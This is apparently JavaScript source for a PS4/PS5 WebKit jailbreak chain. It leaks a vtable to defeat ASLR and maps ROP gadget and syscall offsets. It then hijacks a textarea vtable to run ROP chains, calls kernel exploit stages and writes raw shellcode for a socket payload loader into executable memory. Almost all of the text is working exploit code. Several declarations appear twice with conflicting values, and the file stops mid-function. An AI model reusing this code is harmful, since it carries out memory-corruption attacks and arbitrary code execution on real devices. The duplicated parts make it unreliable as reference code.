//Common chain			  
let chain;
let kchain;
let kchain2;
let SAVED_KERNEL_STACK_PTR;
let KERNEL_BASE_PTR;

let webKitBase;
let webKitRequirementBase;

let libSceLibcInternalBase;
let libKernelBase;

let textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;
//Bases
let libSceNKWebKitBase;
let libSceLibcInternalBase;
let libKernelBase;
//ASLR defeat patsy (former vtable buddy)
let textArea = document.createElement("textarea");

//Control flag
const IS_PS5 = navigator.userAgent.includes("PlayStation 5");

function set_offset_for_platform(ps5_offset, ps4_offset) {
    return (IS_PS5) ? ps5_offset : ps4_offset;
}

const OFFSET_wk_vtable_first_element = set_offset_for_platform(0x00D04580, 0x0104F110);
const OFFSET_wk_memset_import = set_offset_for_platform(0x028F9D38, 0x02F4A4E8);
const OFFSET_wk___stack_chk_fail_import = set_offset_for_platform(0x028F9C38, 0x02F4A450);

const OFFSET_lk___stack_chk_fail = set_offset_for_platform(0x00019970, 0x0001FF60);
const OFFSET_lk_pthread_create_name_np = set_offset_for_platform(0x00001B60, 0x00019F10);
const OFFSET_lk_pthread_exit = set_offset_for_platform(0x00020A80, 0x000077A0);
const OFFSET_lk_pthread_join = set_offset_for_platform(0x0002FAD0, 0x0000AFA0);
const OFFSET_lk__thread_list = set_offset_for_platform(0x000601A8, 0x00058248);

const OFFSET_lc_memset = set_offset_for_platform(0x000148F0, 0x0004F810);
const OFFSET_lc_setjmp = set_offset_for_platform(0x0005E9B0, 0x000BB5BC);
const OFFSET_lc_longjmp = set_offset_for_platform(0x0005EA00, 0x000BB616);
																   

const OFFSET_WORKER_STACK_OFFSET = set_offset_for_platform(0x0007FB88, 0x0007FB28);

//ps5 malloc: 0x05C60
//ps5 free  : 0x05C70
//ps5 memcpy: 0x03A90
//ps5 memcmp: 0x437F0

//ps5 __error: 0x1D2A0
	   
 



let nogc = [];
let syscalls = {};
let gadgets = {};

let ps5_syscall_map = {
    0x001: 0x34230, // sys_exit
    0x002: 0x351E0, // sys_fork
    0x003: 0x33400, // sys_read
    0x004: 0x33360, // sys_write
    0x005: 0x33A00, // sys_open
    0x006: 0x34030, // sys_close
    0x007: 0x32C20, // sys_wait4
    0x00A: 0x34D20, // sys_unlink
    0x00C: 0x346B0, // sys_chdir
    0x00F: 0x340B0, // sys_chmod
    0x014: 0x33580, // sys_getpid
    0x017: 0x33080, // sys_setuid
    0x018: 0x34690, // sys_getuid
    0x019: 0x33A40, // sys_geteuid
    0x01B: 0x33AE0, // sys_recvmsg
    0x01C: 0x33D10, // sys_sendmsg
    0x01D: 0x34860, // sys_recvfrom
    0x01E: 0x32F80, // sys_accept
    0x01F: 0x32DA0, // sys_getpeername
    0x020: 0x34EC0, // sys_getsockname
    0x021: 0x349E0, // sys_access
    0x022: 0x34B60, // sys_chflags
    0x023: 0x34530, // sys_fchflags
    0x024: 0x35410, // sys_sync
    0x025: 0x339E0, // sys_kill
    0x027: 0x33480, // sys_getppid
    0x029: 0x34A40, // sys_dup
    0x02A: 0x333D0, // sys_pipe
    0x02B: 0x35080, // sys_getegid
    0x02C: 0x353D0, // sys_profil
    0x02F: 0x32F20, // sys_getgid
    0x031: 0x32F00, // sys_getlogin
    0x032: 0x34790, // sys_setlogin
    0x035: 0x33140, // sys_sigaltstack
    0x036: 0x332A0, // sys_ioctl
    0x037: 0x34570, // sys_reboot
    0x038: 0x34470, // sys_revoke
    0x03B: 0x34770, // sys_execve
    0x041: 0x34110, // sys_msync
    0x049: 0x33900, // sys_munmap
    0x04A: 0x34670, // sys_mprotect
    0x04B: 0x337F0, // sys_madvise
    0x04E: 0x339C0, // sys_mincore
    0x04F: 0x32E80, // sys_getgroups
    0x050: 0x33420, // sys_setgroups
    0x053: 0x32E60, // sys_setitimer
    0x056: 0x32C80, // sys_getitimer
    0x059: 0x344D0, // sys_getdtablesize
    0x05A: 0x348E0, // sys_dup2
    0x05C: 0x33F10, // sys_fcntl
    0x05D: 0x33A60, // sys_select
    0x05F: 0x32EC0, // sys_fsync
    0x060: 0x33DF0, // sys_setpriority
    0x061: 0x33640, // sys_socket
    0x062: 0x346D0, // sys_connect
    0x063: 0x35040, // sys_netcontrol
    0x064: 0x32C40, // sys_getpriority
    0x065: 0x34C60, // sys_netabort
    0x066: 0x34FE0, // sys_netgetsockinfo
    0x068: 0x34CE0, // sys_bind
    0x069: 0x33F50, // sys_setsockopt
    0x06A: 0x33240, // sys_listen
    0x071: 0x34250, // sys_socketex
    0x072: 0x33C20, // sys_socketclose
    0x074: 0x353F0, // sys_gettimeofday
    0x075: 0x354D0, // sys_getrusage
    0x076: 0x32C00, // sys_getsockopt
    0x078: 0x33E90, // sys_readv
    0x079: 0x33CF0, // sys_writev
    0x07A: 0x34940, // sys_settimeofday
    0x07C: 0x33880, // sys_fchmod
    0x07D: 0x340F0, // sys_netgetiflist
    0x07E: 0x34FC0, // sys_setreuid
    0x07F: 0x33BE0, // sys_setregid
    0x080: 0x34B40, // sys_rename
    0x083: 0x33B60, // sys_flock
    0x085: 0x35430, // sys_sendto
    0x086: 0x35260, // sys_shutdown
    0x087: 0x345F0, // sys_socketpair
    0x088: 0x34390, // sys_mkdir
    0x089: 0x335E0, // sys_rmdir
    0x08A: 0x32AF0, // sys_utimes
    0x08C: 0x34F80, // sys_adjtime
    0x08D: 0x340D0, // sys_kqueueex
    0x093: 0x34330, // sys_setsid
    0x0A5: 0x32E20, // sys_sysarch
    0x0B6: 0x34DC0, // sys_setegid
    0x0B7: 0x32C60, // sys_seteuid
    0x0BC: 0x34E20, // sys_stat
    0x0BD: 0x35220, // sys_fstat
    0x0BE: 0x33C00, // sys_lstat
    0x0BF: 0x33300, // sys_pathconf
    0x0C0: 0x345B0, // sys_fpathconf
    0x0C2: 0x33B40, // sys_getrlimit
    0x0C3: 0x33720, // sys_setrlimit
    0x0C4: 0x34D40, // sys_getdirentries
    0x0CA: 0x34B20, // sys___sysctl
    0x0CB: 0x341D0, // sys_mlock
    0x0CC: 0x34BC0, // sys_munlock
    0x0CE: 0x33680, // sys_futimes
    0x0D1: 0x33C60, // sys_poll
    0x0E8: 0x32D20, // sys_clock_gettime
    0x0E9: 0x34190, // sys_clock_settime
    0x0EA: 0x35190, // sys_clock_getres
    0x0EB: 0x34D60, // sys_ktimer_create
    0x0EC: 0x334E0, // sys_ktimer_delete
    0x0ED: 0x35240, // sys_ktimer_settime
    0x0EE: 0x346F0, // sys_ktimer_gettime
    0x0EF: 0x338A0, // sys_ktimer_getoverrun
    0x0F0: 0x34C20, // sys_nanosleep
    0x0F1: 0x34450, // sys_ffclock_getcounter
    0x0F2: 0x33440, // sys_ffclock_setestimate
    0x0F3: 0x342D0, // sys_ffclock_getestimate
    0x0F7: 0x34CC0, // sys_clock_getcpuclockid2
    0x0FD: 0x34880, // sys_issetugid
    0x110: 0x35020, // sys_getdents
    0x121: 0x34730, // sys_preadv
    0x122: 0x33C80, // sys_pwritev
    0x136: 0x33980, // sys_getsid
    0x13B: 0x34E40, // sys_aio_suspend
    0x144: 0x33500, // sys_mlockall
    0x145: 0x34900, // sys_munlockall
    0x147: 0x33600, // sys_sched_setparam
    0x148: 0x34270, // sys_sched_getparam
    0x149: 0x32DC0, // sys_sched_setscheduler
    0x14A: 0x33C40, // sys_sched_getscheduler
    0x14B: 0x33AA0, // sys_sched_yield
    0x14C: 0x33040, // sys_sched_get_priority_max
    0x14D: 0x33160, // sys_sched_get_priority_min
    0x14E: 0x33390, // sys_sched_rr_get_interval
    0x154: 0x32B50, // sys_sigprocmask
    0x155: 0x32B90, // sys_sigsuspend
    0x157: 0x34A60, // sys_sigpending
    0x159: 0x34B80, // sys_sigtimedwait
    0x15A: 0x347C0, // sys_sigwaitinfo
    0x16A: 0x34DA0, // sys_kqueue
    0x16B: 0x33000, // sys_kevent
    0x17B: 0x32FA0, // sys_mtypeprotect
    0x188: 0x330C0, // sys_uuidgen
    0x189: 0x35510, // sys_sendfile
    0x18D: 0x33560, // sys_fstatfs
    0x190: 0x33120, // sys_ksem_close
    0x191: 0x33EB0, // sys_ksem_post
    0x192: 0x34750, // sys_ksem_wait
    0x193: 0x354F0, // sys_ksem_trywait
    0x194: 0x33260, // sys_ksem_init
    0x195: 0x34C80, // sys_ksem_open
    0x196: 0x34960, // sys_ksem_unlink
    0x197: 0x330E0, // sys_ksem_getvalue
    0x198: 0x34920, // sys_ksem_destroy
    0x1A0: 0x34E00, // sys_sigaction
    0x1A1: 0x34AA0, // sys_sigreturn
    0x1A5: 0x33780, // sys_getcontext
    0x1A6: 0x344B0, // sys_setcontext
    0x1A7: 0x345D0, // sys_swapcontext
    0x1AD: 0x337D0, // sys_sigwait
    0x1AE: 0x32EA0, // sys_thr_create
    0x1AF: 0x33200, // sys_thr_exit
    0x1B0: 0x33BA0, // sys_thr_self
    0x1B1: 0x33220, // sys_thr_kill
    0x1B9: 0x34840, // sys_ksem_timedwait
    0x1BA: 0x32B70, // sys_thr_suspend
    0x1BB: 0x334A0, // sys_thr_wake
    0x1BC: 0x34510, // sys_kldunloadf
    0x1C6: 0x32BF0, // sys__umtx_op
    0x1C6: 0x35200, // sys__umtx_op
    0x1C7: 0x34F40, // sys_thr_new
    0x1C8: 0x34EA0, // sys_sigqueue
    0x1D0: 0x34800, // sys_thr_set_name
    0x1D2: 0x33DB0, // sys_rtprio_thread
    0x1DB: 0x33540, // sys_pread
    0x1DC: 0x34650, // sys_pwrite
    0x1DD: 0x34F20, // sys_mmap
    0x1DE: 0x34A20, // sys_lseek
    0x1DF: 0x33AC0, // sys_truncate
    0x1E0: 0x33520, // sys_ftruncate
    0x1E1: 0x32B10, // sys_thr_kill2
    0x1E2: 0x35490, // sys_shm_open
    0x1E3: 0x34F00, // sys_shm_unlink
    0x1E6: 0x33740, // sys_cpuset_getid
    0x1E7: 0x35300, // sys_cpuset_getaffinity
    0x1E8: 0x34AC0, // sys_cpuset_setaffinity
    0x1F3: 0x32EE0, // sys_openat
    0x203: 0x34590, // sys___cap_rights_get
    0x20A: 0x33FD0, // sys_pselect
    0x214: 0x34090, // sys_regmgr_call
    0x215: 0x33E10, // sys_jitshm_create
    0x216: 0x343F0, // sys_jitshm_alias
    0x217: 0x332E0, // sys_dl_get_list
    0x218: 0x34130, // sys_dl_get_info
    0x21A: 0x34070, // sys_evf_create
    0x21B: 0x334C0, // sys_evf_delete
    0x21C: 0x34410, // sys_evf_open
    0x21D: 0x33FF0, // sys_evf_close
    0x21E: 0x342B0, // sys_evf_wait
    0x21F: 0x34A80, // sys_evf_trywait
    0x220: 0x34430, // sys_evf_set
    0x221: 0x349A0, // sys_evf_clear
    0x222: 0x337B0, // sys_evf_cancel
    0x223: 0x34290, // sys_query_memory_protection
    0x224: 0x33B80, // sys_batch_map
    0x225: 0x33D90, // sys_osem_create
    0x226: 0x32D60, // sys_osem_delete
    0x227: 0x32CE0, // sys_osem_open
    0x228: 0x352E0, // sys_osem_close
    0x229: 0x34370, // sys_osem_wait
    0x22A: 0x34980, // sys_osem_trywait
    0x22B: 0x34610, // sys_osem_post
    0x22C: 0x33EF0, // sys_osem_cancel
    0x22D: 0x33CA0, // sys_namedobj_create
    0x22E: 0x339A0, // sys_namedobj_delete
    0x22F: 0x35570, // sys_set_vm_container
    0x230: 0x33460, // sys_debug_init
    0x233: 0x33DD0, // sys_opmc_enable
    0x234: 0x32E40, // sys_opmc_disable
    0x235: 0x33E50, // sys_opmc_set_ctl
    0x236: 0x33E70, // sys_opmc_set_ctr
    0x237: 0x348C0, // sys_opmc_get_ctr
    0x23C: 0x336E0, // sys_virtual_query
    0x249: 0x34D00, // sys_is_in_sandbox
    0x24A: 0x338C0, // sys_dmem_container
    0x24B: 0x34170, // sys_get_authinfo
    0x24C: 0x32CC0, // sys_mname
    0x24F: 0x332C0, // sys_dynlib_dlsym
    0x250: 0x335C0, // sys_dynlib_get_list
    0x251: 0x35060, // sys_dynlib_get_info
    0x252: 0x33F70, // sys_dynlib_load_prx
    0x253: 0x32F60, // sys_dynlib_unload_prx
    0x254: 0x34DE0, // sys_dynlib_do_copy_relocations
    0x256: 0x33D70, // sys_dynlib_get_proc_param
    0x257: 0x350C0, // sys_dynlib_process_needed_and_relocate
    0x258: 0x32B30, // sys_sandbox_path
    0x259: 0x336A0, // sys_mdbg_service
    0x25A: 0x33D30, // sys_randomized_path
    0x25B: 0x34BA0, // sys_rdup
    0x25C: 0x331A0, // sys_dl_get_metadata
    0x25D: 0x338E0, // sys_workaround8849
    0x25E: 0x330A0, // sys_is_development_mode
    0x25F: 0x34210, // sys_get_self_auth_info
    0x260: 0x354B0, // sys_dynlib_get_info_ex
    0x262: 0x35550, // sys_budget_get_ptype
    0x263: 0x333B0, // sys_get_paging_stats_of_all_threads
    0x264: 0x352C0, // sys_get_proc_type_info
    0x265: 0x32AD0, // sys_get_resident_count
    0x267: 0x33E30, // sys_get_resident_fmem_count
    0x268: 0x34EE0, // sys_thr_get_name
    0x269: 0x344F0, // sys_set_gpo
    0x26A: 0x341F0, // sys_get_paging_stats_of_all_objects
    0x26B: 0x32FE0, // sys_test_debug_rwmem
    0x26C: 0x33100, // sys_free_stack
    0x26E: 0x32D00, // sys_ipmimgr_call
    0x26F: 0x34150, // sys_get_gpo
    0x270: 0x35530, // sys_get_vm_map_timestamp
    0x271: 0x34AE0, // sys_opmc_set_hw
    0x272: 0x33620, // sys_opmc_get_hw
    0x273: 0x32CA0, // sys_get_cpu_usage_all
    0x274: 0x34310, // sys_mmap_dmem
    0x275: 0x336C0, // sys_physhm_open
    0x276: 0x33ED0, // sys_physhm_unlink
    0x278: 0x35470, // sys_thr_suspend_ucontext
    0x279: 0x33960, // sys_thr_resume_ucontext
    0x27A: 0x33920, // sys_thr_get_ucontext
    0x27B: 0x33A20, // sys_thr_set_ucontext
    0x27C: 0x33660, // sys_set_timezone_info
    0x27D: 0x343B0, // sys_set_phys_fmem_limit
    0x27E: 0x33760, // sys_utc_to_localtime
    0x27F: 0x35590, // sys_localtime_to_utc
    0x280: 0x34710, // sys_set_uevt
    0x281: 0x33280, // sys_get_cpu_usage_proc
    0x282: 0x33B00, // sys_get_map_statistics
    0x283: 0x348A0, // sys_set_chicken_switches
    0x286: 0x351C0, // sys_get_kernel_mem_statistics
    0x287: 0x343D0, // sys_get_sdk_compiled_version
    0x288: 0x32D40, // sys_app_state_change
    0x289: 0x34F60, // sys_dynlib_get_obj_member
    0x28C: 0x32DE0, // sys_process_terminate
    0x28D: 0x335A0, // sys_blockpool_open
    0x28E: 0x33340, // sys_blockpool_map
    0x28F: 0x34D80, // sys_blockpool_unmap
    0x290: 0x349C0, // sys_dynlib_get_info_for_libdbg
    0x291: 0x33A80, // sys_blockpool_batch
    0x292: 0x331E0, // sys_fdatasync
    0x293: 0x33700, // sys_dynlib_get_list2
    0x294: 0x35450, // sys_dynlib_get_info2
    0x295: 0x34C00, // sys_aio_submit
    0x296: 0x33180, // sys_aio_multi_delete
    0x297: 0x33FB0, // sys_aio_multi_wait
    0x298: 0x33060, // sys_aio_multi_poll
    0x299: 0x34B00, // sys_aio_get_data
    0x29A: 0x33F90, // sys_aio_multi_cancel
    0x29B: 0x32F40, // sys_get_bio_usage_all
    0x29C: 0x34630, // sys_aio_create
    0x29D: 0x350A0, // sys_aio_submit_cmd
    0x29E: 0x34FA0, // sys_aio_init
    0x29F: 0x34A00, // sys_get_page_table_stats
    0x2A0: 0x34E60, // sys_dynlib_get_list_for_libdbg
    0x2A1: 0x35000, // sys_blockpool_move
    0x2A2: 0x34E80, // sys_virtual_query_all
    0x2A3: 0x33F30, // sys_reserve_2mb_page
    0x2A4: 0x347E0, // sys_cpumode_yield
    0x2A5: 0x342F0, // sys_wait6
    0x2A6: 0x33D50, // sys_cap_rights_limit
    0x2A7: 0x33320, // sys_cap_ioctls_limit
    0x2A8: 0x34050, // sys_cap_ioctls_get
    0x2A9: 0x34820, // sys_cap_fcntls_limit
    0x2AA: 0x32FC0, // sys_cap_fcntls_get
    0x2AB: 0x35320, // sys_bindat
    0x2AC: 0x33B20, // sys_connectat
    0x2AD: 0x32D80, // sys_chflagsat
    0x2AE: 0x32BD0, // sys_accept4
    0x2AF: 0x331C0, // sys_pipe2
    0x2B0: 0x33BC0, // sys_aio_mlock
    0x2B1: 0x352A0, // sys_procctl
    0x2B2: 0x34550, // sys_ppoll
    0x2B3: 0x34490, // sys_futimens
    0x2B4: 0x34C40, // sys_utimensat
    0x2B5: 0x341B0, // sys_numa_getaffinity
    0x2B6: 0x34010, // sys_numa_setaffinity
    0x2C1: 0x33020, // sys_get_phys_page_size
    0x2C9: 0x35280, // sys_get_ppr_sdk_compiled_version
    0x2CC: 0x33860, // sys_openintr
    0x2CD: 0x34350, // sys_dl_get_info_2
    0x2CE: 0x33940, // sys_acinfo_add
    0x2CF: 0x32BB0, // sys_acinfo_delete
    0x2D0: 0x34BE0, // sys_acinfo_get_all_for_coredump
    0x2D1: 0x34CA0, // sys_ampr_ctrl_debug
    0x2D2: 0x32E00, // sys_workspace_ctrl
}					   
let nogc = [];
let syscalls = {};
let gadgets = {};
let wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF,

    "mov [rax], cl": 0xC6EAF,
};

let wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

let wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
    "mov [rax], cx": 0x15A7D52,
};
let hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
let ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    //RW -> ROP method is strongly based off of:
    //https://github.com/Cryptogenic/PS4-6.20-WebKit-Code-Execution-Exploit

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    //pointer to vtable address
    let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    let textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (let gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (let gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        let instr = p.read4(address) & 0xFFFF;
        let offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        let backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        let backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        let ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        let og_array = new Uint32Array(0x1000);
        let og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(0x8), size);
        p.write4(og_array_i.add32(0xC), 0x1);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        let bufView = new Uint8Array(str.length + 1);
        for (let i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        let str = "";
        for (let i = 0;; i++) {
            let c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    let fakeVtable_setjmp = p.malloc32(0x200);
    let fakeVtable_longjmp = p.malloc32(0x200);
    let original_context = p.malloc32(0x40);
    let modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    let kview = new Uint8Array(0x1000);
    let kstr = p.leakval(kview).add32(0x10);
    let orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    let countbytes;

    for (let i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    let dview32 = new Uint32Array(1);
    let dview8 = new Uint8Array(dview32.buffer);
    for (let i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            let syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();

    //Sanity check
    if (chain.syscall(20).low == 0) {
        alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");
        while (1);
    }
}

function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
        kernel();
        //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
        //p.write8(0x0, 0x0); //write to 0x0 -> kill browser.
    }

    let payload_buffer = chain.syscall(477, 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
    let payload_loader = p.malloc32(0x1000);

    //NOTE: You can replace this with a payload instead of the loader.
    //You would need to create an array view of payload_buffer to do that. (let payload_writer = p.array_from_address(payload_buffer);)
    //And other ways, ....

    //This is  x86_64 asm, you can disassemble it* if you want to know what the payload loader does under the hood. (* will need to account for endianness)
    let loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;
    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

    let pthread = p.malloc(0x10);
    //
    {
        chain.fcall(window.syscalls[203], payload_buffer, 0x300000);
        chain.fcall(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
    }
    chain.run();


    awaitpl();
}

function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
    patch_once();
}

let handle;
let random_path;
let ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    let res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    let tlsinit = p.read8(ex_info.add32(0x110));
    let tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
